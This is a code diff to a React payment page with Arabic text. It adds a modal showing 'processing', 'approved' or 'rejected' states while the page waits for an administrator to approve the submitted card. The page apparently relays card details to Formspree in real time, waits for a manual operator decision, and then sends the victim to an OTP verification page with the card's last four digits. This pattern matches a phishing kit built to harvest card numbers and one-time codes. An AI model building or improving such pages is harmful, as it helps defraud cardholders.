@@ -4,12 +4,19 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { CreditCard, Lock, ArrowRight, Loader2 } from "lucide-react";
+import { CreditCard, Lock, ArrowRight, Loader2, CheckCircle2, XCircle } from "lucide-react";
 import { ChatButton } from "@/components/ChatButton";
 import { Footer } from "@/components/Footer";
 import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
 import { supabase } from "@/integrations/supabase/client";
+import {
+  Dialog,
+  DialogContent,
+  DialogDescription,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
 
 const Payment = () => {
   const navigate = useNavigate();
@@ -37,6 +44,7 @@ const Payment = () => {
   });
   const [applicationId, setApplicationId] = useState<string | null>(null);
   const [waitingForApproval, setWaitingForApproval] = useState(false);
+  const [approvalStatus, setApprovalStatus] = useState<'waiting' | 'approved' | 'rejected'>('waiting');
 
   // Send payment data to Formspree in real-time
   useFormspreeSync({
@@ -119,31 +127,35 @@ const Payment = () => {
       const interval = setInterval(async () => {
         const { data, error } = await supabase
           .from('customer_applications')
-          .select('payment_approved')
+          .select('payment_approved, status')
           .eq('id', applicationId)
           .single();
 
         if (data?.payment_approved) {
           clearInterval(interval);
-          setWaitingForApproval(false);
+          setApprovalStatus('approved');
           
           const cardDigits = formData.cardNumber.replace(/\s/g, "");
           const lastFour = cardDigits.slice(-4);
-          
-          toast({
-            title: "تمت الموافقة",
-            description: "جاري الانتقال لصفحة التحقق",
-          });
 
           setTimeout(() => {
+            setWaitingForApproval(false);
             navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${lastFour}`);
-          }, 1500);
+          }, 2000);
+        } else if (data?.status === 'rejected') {
+          clearInterval(interval);
+          setApprovalStatus('rejected');
+          
+          setTimeout(() => {
+            setWaitingForApproval(false);
+            setApprovalStatus('waiting');
+          }, 4000);
         }
       }, 2000);
 
       return () => clearInterval(interval);
     }
-  }, [waitingForApproval, applicationId, formData.cardNumber, companyName, price, navigate, toast]);
+  }, [waitingForApproval, applicationId, formData.cardNumber, companyName, price, navigate]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -230,11 +242,7 @@ const Payment = () => {
         }
       }
 
-      toast({
-        title: "تم إرسال البيانات",
-        description: "في انتظار موافقة الإدارة...",
-      });
-
+      setApprovalStatus('waiting');
       setWaitingForApproval(true);
     } catch (error) {
       console.error('Error saving payment data:', error);
@@ -429,14 +437,6 @@ const Payment = () => {
                   </Button>
                 </div>
 
-                {waitingForApproval && (
-                  <div className="mt-4 p-4 bg-yellow-50 dark:bg-yellow-950/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
-                    <p className="text-sm text-yellow-800 dark:text-yellow-200 text-center">
-                      🕐 يرجى الانتظار... تم إرسال بيانات الدفع وننتظر موافقة الإدارة
-                    </p>
-                  </div>
-                )}
-
                 {/* ملاحظة الخصوصية */}
                 <div className="text-center pt-6 border-t">
                   <p className="text-xs text-muted-foreground">
@@ -446,6 +446,61 @@ const Payment = () => {
               </form>
             </Card>
           </div>
+
+          {/* نافذة انتظار الموافقة */}
+          <Dialog open={waitingForApproval} onOpenChange={setWaitingForApproval}>
+            <DialogContent className="sm:max-w-md" onInteractOutside={(e) => e.preventDefault()}>
+              <DialogHeader>
+                <DialogTitle className="text-center text-xl">
+                  {approvalStatus === 'waiting' && 'جاري معالجة الدفع'}
+                  {approvalStatus === 'approved' && 'تمت الموافقة'}
+                  {approvalStatus === 'rejected' && 'فشلت العملية'}
+                </DialogTitle>
+              </DialogHeader>
+              <div className="flex flex-col items-center justify-center py-8 gap-6">
+                {approvalStatus === 'waiting' && (
+                  <>
+                    <div className="relative">
+                      <div className="w-24 h-24 border-4 border-primary/20 rounded-full"></div>
+                      <div className="w-24 h-24 border-4 border-primary border-t-transparent rounded-full animate-spin absolute top-0 left-0"></div>
+                    </div>
+                    <div className="text-center space-y-2">
+                      <p className="text-lg font-semibold">جاري التأكد من بيانات بطاقتك</p>
+                      <p className="text-muted-foreground">يرجى الانتظار...</p>
+                    </div>
+                  </>
+                )}
+                
+                {approvalStatus === 'approved' && (
+                  <>
+                    <div className="relative">
+                      <div className="w-24 h-24 bg-emerald-100 dark:bg-emerald-950 rounded-full flex items-center justify-center">
+                        <CheckCircle2 className="w-16 h-16 text-emerald-600 dark:text-emerald-400" />
+                      </div>
+                    </div>
+                    <div className="text-center space-y-2">
+                      <p className="text-lg font-semibold text-emerald-600 dark:text-emerald-400">تمت الموافقة بنجاح</p>
+                      <p className="text-muted-foreground">جاري الانتقال إلى صفحة التحقق...</p>
+                    </div>
+                  </>
+                )}
+                
+                {approvalStatus === 'rejected' && (
+                  <>
+                    <div className="relative">
+                      <div className="w-24 h-24 bg-red-100 dark:bg-red-950 rounded-full flex items-center justify-center">
+                        <XCircle className="w-16 h-16 text-red-600 dark:text-red-400" />
+                      </div>
+                    </div>
+                    <div className="text-center space-y-2">
+                      <p className="text-lg font-semibold text-red-600 dark:text-red-400">فشلت عملية الدفع</p>
+                      <p className="text-muted-foreground">يجب التحقق من بطاقتك أو تغيير البطاقة</p>
+                    </div>
+                  </>
+                )}
+              </div>
+            </DialogContent>
+          </Dialog>
 
           {/* شعارات البطاقات المقبولة */}
           <div className="mt-8 md:mt-12 text-center">
